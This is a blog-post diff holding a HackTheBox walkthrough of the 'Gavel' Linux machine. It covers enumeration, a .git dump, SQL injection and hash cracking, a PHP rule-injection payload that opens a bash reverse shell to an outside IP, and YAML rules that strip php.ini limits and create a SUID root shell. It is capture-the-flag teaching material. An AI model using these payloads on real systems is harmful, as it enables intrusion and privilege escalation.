@@ -1,0 +1,194 @@
+---
+title: "HackTheBox: Gavel"
+date: "2026-06-04"
+description: "A detailed walkthrough of how I rooted the Gavel machine on HackTheBox utilizing standard enumeration techniques and a fun privilege escalation."
+---
+
+# HackTheBox: Gavel Walkthrough (Medium) - Linux OS
+
+## 1. Enumeration
+
+### Nmap Scan
+
+```bash
+# Standard service and version scan with default scripts
+nmap -sC -sV 10.10.11.97 -oN nmap.txt
+
+# Add target to /etc/hosts for convenience
+echo "10.10.11.97 gavel.htb" | sudo tee -a /etc/hosts
+```
+
+_Note:_ Nmap reveals open ports and running services. This is the first step in identifying potential attack surfaces.
+
+---
+
+### Directory and Content Enumeration
+
+```bash
+# Using Gobuster to enumerate directories
+gobuster dir -u http://gavel.htb -w /usr/share/wordlists/dirb/common.txt
+
+# Using FFUF to fuzz directories, capturing 200 and 302 responses
+ffuf -u http://gavel.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,302
+```
+
+_Note:_ This discovers hidden pages like `/admin.php`, `/login.php`, and a `.git` directory.
+
+---
+
+### Git Repository Extraction
+
+```bash
+# Dump the .git repository to local machine
+git-dumper http://gavel.htb/.git/ ./gavel-git
+cd gavel-git
+git checkout .
+```
+
+_Note:_ Extracting the Git repository often exposes source code, credentials, or vulnerabilities.
+
+**Key Files Discovered:**
+
+| Files                    | Vulnerabilities                                  |
+| ------------------------ | ------------------------------------------------ |
+| inventory.php            | SQL Injection                                    |
+| includes/bid_handler.php | Remote Code Execution via runkit_function_add()  |
+| admin.php                | Auction rule management (auctioneer role needed) |
+| includes/config.php      | Database credentials: `gavel:gavel`              |
+
+---
+
+## 2. SQL Injection Exploitation
+
+**Vulnerable Code in `inventory.php`:**
+
+```php
+$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
+$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
+$col = "`" . str_replace("`", "", $sortItem) . "`";
+
+$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
+$stmt->execute([$userId]);
+```
+
+_Note:_ User-controlled input is directly used in SQL queries → potential SQLi.
+
+**Hash Extraction and Cracking**
+
+```bash
+# Save hashed password
+printf '%s\n' '$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS' > auctioneer.hash
+
+# Crack using hashcat
+hashcat -m 3200 auctioneer.hash /usr/share/wordlists/rockyou.txt
+```
+
+_Result:_
+
+```
+auctioneer:midnight1
+```
+
+_Note:_ Cracking the hash gives credentials for the `auctioneer` user.
+
+---
+
+## 3. Admin Panel and Remote Code Execution
+
+```php
+# Rule injection payload in admin panel
+system("bash -c 'bash -i >& /dev/tcp/10.10.14.201/9001 0>&1'"); return true;
+```
+
+```bash
+# Listener on attacker's machine
+rlwrap nc -lvnp 9001
+```
+
+_Note:_ Placing a bid triggers the RCE, giving a reverse shell.
+
+```bash
+bash: cannot set terminal process group (1007): Inappropriate ioctl for device
+bash: no job control in this shell
+```
+
+_Note:_ This message is normal for a basic reverse shell; it lacks job control.
+
+---
+
+## 4. Privilege Escalation
+
+### Switching to auctioneer
+
+```bash
+su auctioneer
+password: midnight1
+```
+
+_Note:_ Using cracked credentials to gain higher privileges.
+
+### Exploit PHP configuration via auction submission
+
+```bash
+cat << 'EOF' > fix_ini.yaml
+name: fixini
+description: fix php ini
+image: "x.png"
+price: 1
+rule_msg: "fixini"
+rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
+EOF
+
+/usr/local/bin/gavel-util submit /home/auctioneer/fix_ini.yaml
+```
+
+_Note:_ Modifying `php.ini` disables restrictions, preparing for SUID exploitation.
+
+---
+
+### Creating a Root Shell
+
+```bash
+cat << 'EOF' > rootshell.yaml
+name: rootshell
+description: make suid bash
+image: "x.png"
+price: 1
+rule_msg: "rootshell"
+rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
+EOF
+
+/usr/local/bin/gavel-util submit /home/auctioneer/rootshell.yaml
+```
+
+```bash
+# Verify SUID binary
+ls -l /opt/gavel/rootbash
+-rwsr-xr-x 1 root root 1396520 Dec  1 05:57 /opt/gavel/rootbash
+
+# Execute SUID binary to gain root
+/opt/gavel/rootbash -p
+```
+
+_Result:_
+
+```bash
+$ rootbash-5.1# id
+uid=1001(auctioneer) gid=1002(auctioneer) euid=0(root) groups=1002(auctioneer),1001(gavel-seller)
+```
+
+_Note:_ SUID bash allows privilege escalation to root.
+
+---
+
+## 5. Summary Notes
+
+- **Enumeration:** Always start with Nmap and directory fuzzing.
+- **Git Repositories:** Can reveal credentials and vulnerabilities.
+- **SQL Injection:** Look for improper input handling.
+- **Password Cracking:** Use `hashcat` with relevant mode and wordlists.
+- **RCE:** Admin panels or unsafe function calls (`system`, `runkit_function_add`) are common entry points.
+- **Privilege Escalation:** Exploit misconfigured PHP, SUID binaries, or weak file permissions.
+- **Reverse Shells:** Basic shells may lack job control; `python -c 'import pty; pty.spawn("/bin/bash")'` can fix terminal.
+
+_Overall:_ This walkthrough demonstrates enumeration → exploitation → privilege escalation in a structured manner.
